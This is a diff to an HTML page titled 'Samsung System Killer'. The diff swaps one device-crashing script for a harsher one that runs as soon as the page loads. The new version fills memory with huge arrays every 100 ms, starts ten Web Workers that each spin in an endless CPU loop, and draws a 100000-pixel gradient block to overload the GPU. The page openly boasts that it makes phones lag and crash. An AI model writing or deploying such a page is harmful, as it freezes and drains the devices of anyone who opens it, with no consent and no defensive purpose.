@@ -1,36 +1,45 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Samsung Phone Killer</title>
+    <title>Samsung System Killer</title>
     <script>
       window.onload = function () {
-        // Heavy CPU loop in background thread to avoid browser crash
-        function stressCPU() {
-          let i = 0;
+        // Memory Hog
+        let bigMemory = [];
+        setInterval(() => {
+          for (let i = 0; i < 100; i++) {
+            bigMemory.push(new Array(1000000).fill("Samsung is the worst company ever!"));
+          }
+          console.log("Filling RAM like a Tapori legend...");
+        }, 100);
+
+        // CPU Stress (without crashing browser)
+        function superLoad() {
+          let a = 1;
           while (true) {
-            i++;
-            Math.sqrt(i * Math.random());
-            if (i % 100000 === 0) console.log("Samsung dying...");
+            a *= Math.random() * 99999;
+            if (a > 1e300) a = 1; // reset to prevent NaN
           }
         }
 
-        // Spawn multiple Web Workers (only on supported devices)
-        for (let j = 0; j < 8; j++) {
-          const blob = new Blob(["(" + stressCPU.toString() + ")()"]);
+        // Run stress in background using Workers
+        for (let i = 0; i < 10; i++) {
+          const blob = new Blob(["(" + superLoad.toString() + ")()"]);
           const url = URL.createObjectURL(blob);
           new Worker(url);
         }
 
-        // Memory Hog — keep allocating memory
-        let hog = [];
-        setInterval(() => {
-          hog.push(new Array(1000000).fill("Samsung worst!"));
-        }, 100);
+        // Force GPU to render massive elements
+        const spamDiv = document.createElement('div');
+        spamDiv.style.width = "100000px";
+        spamDiv.style.height = "100000px";
+        spamDiv.style.background = "repeating-radial-gradient(circle, red, black 5px)";
+        document.body.appendChild(spamDiv);
       };
     </script>
   </head>
   <body>
-    <h1>Samsung Phone Crash Attempt!</h1>
-    <p>Browser zinda hai, phone ki halat tight hai!</p>
+    <h1>Samsung Lag Fest - Full Phone Fry Mode!</h1>
+    <p>Browser is running... phone crying in background!</p>
   </body>
 </html>
